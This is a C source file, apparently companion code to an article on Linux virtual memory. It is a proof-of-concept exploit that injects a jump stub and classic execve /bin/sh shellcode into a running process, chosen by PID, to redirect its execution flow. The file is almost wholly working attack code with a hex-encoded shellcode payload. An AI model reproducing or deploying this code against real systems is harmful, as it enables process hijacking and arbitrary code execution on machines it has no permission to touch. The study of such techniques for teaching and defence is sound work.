/*
 *  Fakeflow.c  - Change flow of a running program 
 *                coded by twiz - twiz@email.it
 *
 *  Questo codice e' parte dell' articolo "Linux Virtual Memory Tripping" 
 *
 *  Compile with :
 *   gcc -o fakeflow fakeflow.c parse.s
 *
 *  Thanks : optyx
 */

#include <stdio.h>
#include <stdlib.h>

extern int parse_rwvirtaddr(int, char *, int, unsigned long, int);
void mcheck(char *maddr);

main(int argc, char **argv) 
{ 
 int pid, ret;
 unsigned long addr; 
 unsigned long addr2 = 0x80494de;

/* We need to jump where the code we want to execute is stored :
 *  \x68\xde\x94\x04\x08  -  pushl 0x80494de
 *  \xc3                  -  ret
 *
 * We' re using 0x80494de because, on the program tested, the data segment
 * started at address 0x80494d4. We could easily automatize that inside code
 * (for example using getvirtaddr or passing it from stdin), but that's just
 * a proof of concept... do it by yourself, i'm too lazy :) 
 */

char jmpbuff[] = "\x68\xde\x94\x04\x08\xc3";

/* Just old Aleph's shellcode */

char code2exec[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40"
"\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";
 

 if ( argc != 2 ) 
  {
   fprintf(stderr, "Usage : %s pid\n", argv[0]);
   exit(1);
  }

   pid = atoi(argv[1]);
   printf("Insert virtual address to start writing arbitrary jump : ");
   scanf("%x", &addr);
   ret = parse_rwvirtaddr(pid, jmpbuff, strlen(jmpbuff), addr, 1); 

    if ( ret == 1 )
     {
      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
      exit(1);
     }

    if ( ret == -1 )
     {
      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
      exit(1);
     }

    if ( ret == -2 )
     {
      fprintf(stderr, "Invalid or Reserved page\n");
      exit(1);
     }

   printf("Using arbitrary address %p (in data segment) to store the shellcode that will be executed\n", addr2);
   printf("Writing shellcode...");
   fflush(stdout);
   ret = parse_rwvirtaddr(pid, code2exec, strlen(code2exec)+1, addr2, 1);

    if ( ret == 1 )
     {
      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
      exit(1);
     }

    if ( ret == -1 )
     {
      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
      exit(1);
     }

    if ( ret == -2 )
     {
      fprintf(stderr, "Invalid or Reserved page\n");
      exit(1);
     }

   printf("Done\n");
   exit(0);
 }   


void mcheck(char *maddr)
{ 
 if (maddr == NULL) 
  {
   fprintf(stderr, "Memory allocation error - malloc()\n"); 
   exit(1);
  }
}         
